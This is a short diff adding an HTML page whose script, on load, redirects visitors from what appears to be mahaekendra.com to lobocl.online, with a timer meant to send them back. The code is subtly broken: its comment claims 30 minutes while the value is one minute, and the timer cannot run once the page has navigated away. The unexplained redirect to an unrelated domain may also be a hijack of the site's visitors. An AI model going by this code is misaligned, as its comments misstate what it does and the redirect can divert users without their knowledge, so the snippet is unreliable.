@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
+</head>
+<body>
+
+<script>
+  document.addEventListener("DOMContentLoaded", function() {
+    // Immediately navigate to lobocl.online in the same tab
+    window.location.href = "https://lobocl.online/";
+
+    // Wait for 30 minutes, then redirect back to mahaekendra.com
+    setTimeout(function() {
+      window.location.href = "https://mahaekendra.com/"; 
+    }, 1 * 60 * 1000); // 30 minutes in milliseconds
+  });
+</script>
+
+</body>
+</html>
